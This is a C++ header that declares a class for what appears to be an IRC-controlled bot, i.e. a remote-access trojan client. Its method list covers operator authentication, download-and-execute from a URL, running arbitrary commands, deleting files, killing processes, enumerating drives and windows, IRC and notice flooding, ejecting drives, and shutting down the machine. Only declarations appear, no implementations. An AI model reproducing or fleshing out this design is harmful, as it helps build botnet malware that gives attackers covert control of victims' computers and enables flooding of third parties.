
class CIRC
{
public:
	CIRC();
	~CIRC();
	int GetSettings(int iServerNumber);
	void StartThread(void);
	int GetStatus(void);
	void SetStaus(int iStatus);

private:
	//include network class
	CNetwork Con;

	//user management
	void AddAuthedUser(char *szUsername, char *szDnsIP);
	bool IsAuthedUser(char *szUsername, char *szDnsIP);
	void CheckAuth(char *szUsername, char *szMessage, char *szDnsIP);
	void DeleteAuthedUser(char *szUsername, char *szDnsIP);
	void ActiveUser(void);

	//for string and auth encryption
	char * EncryptString(char *szString, int iShift, int iKey);
	char * DecryptString(char *szString, int iShift, int iKey);
	int GetDay(void);
	int GetMonth(void);

	//main functions of the bot
	static DWORD WINAPI ServerThread(LPVOID lpNothing);
	void ParseMessages(char *szFromNick, char *szFromNick2, char *szDnsIP, char *szCommand, char *szTo, char *szMessage);
	void GetServerResponseLine(void);
	void ParseServerFile(char *szBuffer, char *szOutput, int iLine);
	void CreateNicklist(char szNicklist[10][20]);
	int GetServerArguments(char *szBuffer, char *szFromNick, char *szFromNick2, char *szDnsIP, char *szCommand, char *szTo, char *szMessage);
	char * CopyToCharacter(char *szSource, char *szDestination, char cCharacter);
	void SendMessage(char *szMessage);

	//botcommands which can be executed by irc
	void GetWindowsVersion(char *szVersion);
	void DeleteFileOnDisk(char *szFilename);
	void KillProcess(char *szProcessNameOrThreadID);
	void EnumProccesses(void);
	void FindFiles(void);
	void FindDrives(void);
	void PrintCurrentDir(void);
	void SetCurrentDir(char *szDir);
	void GetCurrentSystemInfo(void);
	void IRCFlood(char *szTo, char *szCount, char *szText);
	void NoticeFlood(char *szTo, char *szCount, char *szText);
	void FindWindows(void);
	static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);
	void DownloadFile(char *szUrl, char *szDestLocation, int iExecute, int iRedirect);
	void RunApp(char *szCommand, int iRedirect);
	void SetDisplay(int iStatus);
	void GetTime(void);
	void GetSystemUptime(void);
	void ResetNetBios(int iLanCard);
	int GetMACFromLanCard(int iLanCard, char *szMAC);
	void GetMacOfAllCards(void);
	void GetNetworkInfo(NETRESOURCE *hNetRes, int *iDepth);
	void OpenDrive(char *szDevice);
	void CloseDrive(char *szDevice);
	void SetTaskbarStatus(char *szStatus);
	void Shutdown(char *szMethod);

	int iRemoved, iActiveBot, iReturned, iInBuffer,	iToRecieve, iPongSuccess, iStatus, iServerPort, iSendDelay, iLineBreak;
	char szRecBuf[MSG_SIZE], szSendBuf[MSG_SIZE], szLine[MSG_SIZE], szNick[20], szChannel[20], szServer[200], szRandomNicks[10][20], 
		szAuthedUsers[25][20], szAuthedDNS[25][150], szCurrentDir[MSG_SIZE];

	HANDLE hThread;

protected:

};